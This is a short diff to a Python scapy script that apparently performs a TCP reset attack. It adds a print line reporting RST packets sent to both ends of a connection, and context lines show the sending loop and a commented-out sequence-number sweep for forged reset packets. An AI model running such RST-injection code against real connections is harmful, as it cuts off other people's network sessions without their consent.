@@ -61,6 +61,7 @@ if __name__ == "__main__":
             scapy.send(rst_to_src)
             print("Sent packet with seq: " + str(i))
 
+        print(f"Sent rst packets to {source_addr}:{sport} and {dest_addr}:{dest_port}")
 
         # for i in range(seq, seq + 10000000, 10000):
         #     # Create a TCP packet with RST flag set
